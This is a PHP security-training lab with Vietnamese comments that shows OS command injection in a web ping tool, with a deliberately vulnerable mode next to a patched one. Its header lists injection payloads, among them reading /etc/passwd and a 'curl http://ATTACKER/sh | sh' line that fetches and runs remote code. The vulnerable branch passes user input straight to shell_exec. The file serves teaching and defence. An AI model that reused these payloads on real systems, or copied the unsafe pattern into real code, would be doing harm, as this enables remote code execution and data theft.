<?php
/*
 * LAB 1 - OS COMMAND INJECTION  (CWE-78, OWASP A03 Injection, ATT&CK T1059)
 * ---------------------------------------------------------------------------
 * Kịch bản: một "công cụ mạng" cho phép ping tới một host.
 * LỖI: ghép thẳng input người dùng vào lệnh shell -> chèn lệnh tuỳ ý -> RCE.
 *
 * KHAI THÁC (PoC):
 *   host = 127.0.0.1; id
 *   host = 127.0.0.1 && whoami
 *   host = 127.0.0.1 | cat /etc/passwd
 *   host = 127.0.0.1; curl http://ATTACKER/sh | sh      (reverse shell)
 *
 * TOÁN TỬ shell hữu dụng: ;  &&  ||  |  `...`  $(...)  \n
 *
 * CÁCH VÁ (xem hàm safe_ping bên dưới):
 *   - Không gọi shell với dữ liệu người dùng. Dùng escapeshellarg() cho tham số.
 *   - Validate đầu vào theo allow-list (regex IP/hostname).
 *   - Tốt nhất: gọi API/thư viện thay vì shell.
 */

$out = '';
$mode = $_GET['mode'] ?? 'vuln';            // 'vuln' hoặc 'safe' để so sánh
$host = $_REQUEST['host'] ?? '';

function safe_ping(string $host): string {
    // allow-list: chỉ IPv4 hoặc hostname hợp lệ
    if (!preg_match('/^[a-zA-Z0-9.\-]{1,253}$/', $host)) {
        return "Host không hợp lệ.";
    }
    // escapeshellarg bọc tham số; -c 1 giới hạn 1 gói
    $cmd = 'ping -c 1 ' . escapeshellarg($host) . ' 2>&1';
    return shell_exec($cmd) ?? '';
}

if ($host !== '') {
    if ($mode === 'safe') {
        $out = safe_ping($host);
    } else {
        // === LỖI CỐ Ý: nối chuỗi trực tiếp vào shell ===
        $cmd = "ping -c 1 $host 2>&1";
        $out = shell_exec($cmd) ?? '';
    }
}
?>
<!DOCTYPE html><html lang="vi"><head><meta charset="UTF-8"><title>Command Injection</title>
<style>body{font-family:Arial;max-width:760px;margin:30px auto}pre{background:#111;color:#0f0;padding:12px;overflow:auto}input{padding:6px}</style>
</head><body>
<h2>Lab 1 — Công cụ Ping (Command Injection)</h2>
<p>Chế độ hiện tại: <b><?= htmlspecialchars($mode) ?></b> —
   <a href="?mode=vuln">vuln</a> | <a href="?mode=safe">safe</a></p>
<form method="post" action="?mode=<?= htmlspecialchars($mode) ?>">
  Host: <input type="text" name="host" value="<?= htmlspecialchars($host) ?>" size="40" placeholder="127.0.0.1; id">
  <button>Ping</button>
</form>
<?php if ($host !== ''): ?>
  <h3>Kết quả lệnh:</h3>
  <pre><?= htmlspecialchars($out) ?></pre>
  <p><small>Lệnh thực thi (vuln): <code>ping -c 1 <?= htmlspecialchars($host) ?></code></small></p>
<?php endif; ?>
<p><a href="index.php">&larr; Menu</a></p>
</body></html>
